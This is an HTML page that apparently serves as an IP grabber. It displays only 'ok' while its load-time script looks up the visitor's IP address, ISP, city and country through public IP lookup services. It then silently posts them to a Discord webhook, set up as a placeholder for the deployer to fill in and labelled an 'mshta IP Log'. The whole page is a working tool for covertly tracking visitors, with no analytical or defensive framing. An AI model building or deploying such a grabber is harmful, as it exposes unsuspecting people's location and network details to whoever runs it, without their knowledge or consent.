<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>.</title>
    <style>
        body {
            margin: 0; padding: 0;
            background: #000;
            color: #00ff00;
            font-family: monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .ok { font-size: 6rem; font-weight: bold; }
        .log { margin-top: 30px; font-size: 1.2rem; }
    </style>
</head>
<body>
    <div class="ok">ok</div>
    <div class="log" id="log">loading...</div>

    <script>
        // === YOUR DISCORD WEBHOOK HERE ===
        const WEBHOOK = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN";
        // ================================

        async function sendToDiscord(info) {
            if (!WEBHOOK.includes("webhooks/")) return;
            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        content: "🛡️ **mshta IP Log**",
                        embeds: [{
                            title: "New Connection",
                            color: 65280,
                            fields: [
                                {name: "IP", value: info.ip || "N/A", inline: true},
                                {name: "ISP", value: info.isp || info.org || "N/A", inline: true},
                                {name: "City", value: info.city || "N/A", inline: true},
                                {name: "Country", value: info.country_name || info.country || "N/A", inline: true},
                                {name: "Time", value: new Date().toISOString(), inline: false}
                            ]
                        }]
                    })
                });
            } catch(e) {}
        }

        async function getIP() {
            const logEl = document.getElementById("log");
            const apis = [
                "https://ipapi.co/json/",
                "https://ipinfo.io/json",
                "https://freeipapi.com/json",
                "https://api.ipify.org?format=json"
            ];

            for (let url of apis) {
                try {
                    const res = await fetch(url, { cache: "no-store" });
                    if (!res.ok) continue;

                    const data = await res.json();
                    
                    const ip = data.ip || data.query;
                    const isp = data.org || data.isp || data.asn || "Detected";

                    logEl.innerHTML = `IP: ${ip}<br>ISP: ${isp}`;
                    await sendToDiscord(data);
                    return;
                } catch (err) {
                    console.log("API failed, trying next...");
                }
            }

            logEl.textContent = "IP logged (basic)";
            await sendToDiscord({ip: "partial detect"});
        }

        window.onload = getIP;
    </script>
</body>
</html>
